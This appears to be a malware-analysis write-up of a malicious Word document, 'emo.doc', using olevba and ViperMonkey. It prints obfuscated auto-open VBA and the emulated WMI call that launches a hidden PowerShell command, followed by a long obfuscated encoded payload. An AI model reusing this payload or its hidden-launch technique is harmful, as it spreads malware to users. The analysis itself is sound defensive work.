ojnIHCE(JoDasPDE) = (Sin(8) + 6 + 40)
IwHWCHJLB = sqHqe
ojnIHCE(JoDasPDE + JoDasPDE) = (JdtFGmA + 5)
ojnIHCE(JoDasPDE + JoDasPDE) = 2 + Oct(7819) + Rwbej + CDbl(9) + (4 + YBDhHCIR + FMTZFCBH + Cos(2894))
Set Y5ruq1pwxek1348fi = CreateObject(Hy5393z_cu1)
   Dim XayLAAE(6 + 7 + 1 + 7) As String
Set hBkDI = (kuHYCInr)
Dim GUdOBwJFg(6 + 8 + 1 + 4) As String
XayLAAE(DFPEBfGJ) = (Sin(8) + 632 + 555)
MOOXq = yIMQNHJJ
XayLAAE(DFPEBfGJ + DFPEBfGJ) = (QRuDtDeBh + 8952)
XayLAAE(DFPEBfGJ + DFPEBfGJ) = 6 + Oct(4) + ydSHHJF + CDbl(464) + (6107 + jBTBKJJ + gFSXE + Cos(4815))
Dim cREZHj(6 + 7 + 1 + 5) As String
Set fCASJI = (sNHBGJB)
Dim ohlbI(5 + 5 + 1 + 7) As String
cREZHj(EPsmDJFHe) = (Sin(740) + 13 + 3027)
QZkhqLi = bYDhRDF
cREZHj(EPsmDJFHe + EPsmDJFHe) = (NgGemeSEB + 3)
cREZHj(EPsmDJFHe + EPsmDJFHe) = 2011 + Oct(8) + TddiLDt + CDbl(423) + (3 + DajuFERHE + WvQuFBA + Cos(23))
End Function
-------------------------------------------------------------------------------
VBA FORM STRING IN 'emo.doc' - OLE stream: 'Macros/Get4ipjzmjfvp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
][(s)]wP][(s)]w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'emo.doc' - OLE stream: 'Macros/Get4ipjzmjfvp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
][(s)]wtar][(s)]w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'emo.doc' - OLE stream: 'Macros/Get4ipjzmjfvp/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
][(s)]wtu][(s)]w
-------------------------------------------------------------------------------
VBA FORM Variable "b'Fwder3b7t4tqrecw'" IN 'emo.doc' - OLE stream: 'Macros/Get4ipjzmjfvp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'][(s)]wP][(s)]w'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Mvskm12if9c843w3'" IN 'emo.doc' - OLE stream: 'Macros/Get4ipjzmjfvp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'][(s)]wtar][(s)]w'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Cn8r2cg8i626ztt'" IN 'emo.doc' - OLE stream: 'Macros/Get4ipjzmjfvp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
b'][(s)]wtu][(s)]w'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|ChrW                |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

`oleid` showed that document has `VBA Macros`, which is suspicious and could be dangerous.

`olevba` dumped huge obfuscated script which means the script is 110% malicious...

Extract the VBA scripts as one file:
```bash
└─$ olevba emo.doc -c > code.vba
```

Manual analysis was too complicated, so then I found **[ViperMonkey](https://github.com/decalage2/ViperMonkey)** while watching the [Malware Analysis - Malicious VBA](https://youtu.be/KGvLlk01tR8)

```bash
└─$ ./dockermonkey.sh emo.doc
...
Recorded Actions:
+----------------------+-----------------------------------------------+---------------------------------+
| Action               | Parameters                                    | Description                     |
+----------------------+-----------------------------------------------+---------------------------------+
| Start Regular        |                                               | All wildcard matches will match |
| Emulation            |                                               |                                 |
| Found Entry Point    | document_open                                 |                                 |
| CreateObject         | ['winmgmtS:win32_Process']                    | Interesting Function Call       |
| CreateObject         | ['winmgmtS:win32_ProcessStartuP']             | Interesting Function Call       |
| Create               | [')]wPOwersheLL -windowstyle hidden -ENCOD    | Interesting Function Call       |
|                      | ............................................. |                                 |
|                      | Nyoqi]()e[ss[swn_[sim]()]()a]()u', 'NULL',    |                                 |
|                      | 'winmgmts:win32_processstartup']              |                                 |
+----------------------+-----------------------------------------------+---------------------------------+
INFO     Found 3 possible IOCs. Stripping duplicates...

Intermediate IOCs:
+---------------------------------------------------------+
http://schemas.openxmlformats.org/drawingml/2006/main
+---------------------------------------------------------+
)]wPOwersheLL -windowstyle hidden -ENCOD                 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